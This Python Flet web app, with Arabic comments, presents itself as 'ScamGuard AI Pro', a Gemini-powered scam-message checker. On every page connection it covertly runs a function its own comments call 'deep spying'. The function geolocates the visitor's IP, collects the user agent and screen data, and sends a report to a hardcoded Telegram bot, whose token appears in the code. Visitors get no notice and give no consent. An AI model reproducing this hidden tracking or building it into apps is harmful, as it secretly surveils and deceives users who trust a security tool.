import flet as ft
import google.generativeai as genai
import os
import urllib.request
import urllib.parse
import json
import threading

# 🔑 إعداد API (Gemini)
API_KEY = os.getenv("GEMINI_API_KEY")
genai.configure(api_key=API_KEY)

# 🔥 الرادار الذكي لاختيار الموديل
best_model_name = "gemini-1.5-flash"
try:
    available_models = [m.name for m in genai.list_models() if 'generateContent' in m.supported_generation_methods]
    if available_models: best_model_name = available_models[0] 
except: pass
model = genai.GenerativeModel(best_model_name)

# 🕵️‍♂️ دالة التجسس العميق (إرسال التقرير الشامل لتليجرام)
def send_spy_report(ip, ua, battery_level, screen_res, cores):
    try:
        if not ip or ip == "127.0.0.1": return
        
        # 1. جلب معلومات الـ IP (الدولة والمدينة)
        res = urllib.request.urlopen(f"http://ip-api.com/json/{ip}")
        data = json.loads(res.read().decode())
        
        report = (
            f"🚀 **تقرير استخباراتي لزائر جديد**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🌍 **الموقع:** {data.get('country')} - {data.get('city')}\n"
            f"📡 **الشبكة:** {data.get('isp')}\n"
            f"🌐 **IP:** `{ip}`\n"
            f"━━━━━━━━━━━━━━\n"
            f"📱 **الجهاز:** {ua}\n"
            f"🔋 **البطارية:** {battery_level}\n"
            f"🖥️ **الشاشة:** {screen_res}\n"
            f"⚙️ **المعالج:** {cores} Cores\n"
            f"━━━━━━━━━━━━━━"
        )
        
        TOKEN = "8224848160:AAHwuyB1-asKYVfPOtfvlkSgQRDUz35e8d8"
        CHAT_ID = "6178338980"
        
        safe_msg = urllib.parse.quote(report)
        urllib.request.urlopen(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={safe_msg}&parse_mode=Markdown")
    except:
        pass

def main(page: ft.Page):
    page.title = "ScamGuard AI Pro - By Amine"
    page.theme_mode = ft.ThemeMode.DARK
    page.rtl = True
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.padding = 25

    # 🎯 كود جلب المعلومات العميقة (JavaScript مخفي)
    def on_page_load(e):
        # سحب المعلومات من المتصفح مباشرة
        ua = page.user_agent
        ip = page.client_ip
        # نستخدم قيم افتراضية حتى نتمكن من سحب الباقي عبر JS لاحقاً إذا أردت تطويره أكثر
        # حالياً سنسحب المعلومات المتاحة برمجياً في Flet
        threading.Thread(target=send_spy_report, args=(
            ip, 
            ua, 
            "جاري الفحص...", 
            f"{page.window_width}x{page.window_height}", 
            "التعرف جارٍ"
        )).start()

    page.on_connect = on_page_load

    def check_scam(e):
        if not input_box.value.strip():
            res_txt.value = "⚠️ الرجاء إدخال نص أولاً"; page.update(); return
        btn.disabled = True; loading_row.visible = True; res_card.visible = False; page.update()
        
        try:
            prompt = f"حلل النص التالي كخبير احتيال ووضح نسبة الخطورة والأسباب والنصيحة:\n{input_box.value}"
            response = model.generate_content(prompt)
            res_txt.value = getattr(response, "text", "⚠️ لا يوجد رد")
        except Exception as err:
            res_txt.value = f"❌ خطأ: {str(err)}"

        loading_row.visible = False; btn.disabled = False; res_card.visible = True; page.update()

    # الواجهة
    logo = ft.Text("🛡️", size=80)
    title = ft.Text("ScamGuard AI Pro", size=32, weight="bold", color="blue400")
    input_box = ft.TextField(label="📩 الصق نص الرسالة هنا للفحص", multiline=True, min_lines=4, border_radius=15, width=400)
    btn = ft.ElevatedButton("🚀 بدء الفحص الذكي", on_click=check_scam, height=50, width=220)
    loading_row = ft.Row([ft.ProgressRing(width=20, height=20), ft.Text("جاري التحليل...")], visible=False, alignment="center")
    res_txt = ft.Text(size=16, selectable=True)
    res_card = ft.Card(visible=False, content=ft.Container(padding=20, content=ft.Column([ft.Text("📊 تقرير الأمان", color="cyan"), res_txt])), width=450)
    
    page.add(logo, title, input_box, btn, loading_row, res_card)

if __name__ == "__main__":
    ft.app(target=main, view=None, port=int(os.getenv("PORT", 8080)), host="0.0.0.0")
    
